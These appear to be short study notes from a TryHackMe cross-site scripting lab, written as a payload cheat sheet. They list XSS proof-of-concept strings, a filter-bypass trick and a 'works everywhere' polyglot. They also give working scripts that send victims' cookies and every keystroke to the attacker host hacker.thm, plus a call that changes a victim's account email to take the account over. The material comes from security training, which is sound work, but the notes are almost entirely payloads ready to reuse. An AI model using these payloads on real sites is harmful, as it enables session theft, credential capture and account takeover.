# Intro to Cross-site Scripting

https://tryhackme.com/room/xss


## POC

Run this first to see if the site is succeptable. 

`<script>alert('XSS');</script>`

or escaped

`"><script>alert('THM');</script>`

Or in javascript

`';alert('THM');//`


if it removes `script` from the input, you can trick it like this

`<sscriptcript>alert('THM');</sscriptcript>`

If its a form, you can do this:

`/images/cat.jpg" onload="alert('THM');`


### Hail Marry Polyglot

Use this! it should work everywhere: 
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Session Stealing

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

## KeyLogger

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

## Change email

Way to change the email then initate a password reset
`<script>user.changeEmail('attacker@hacker.thm');</script>`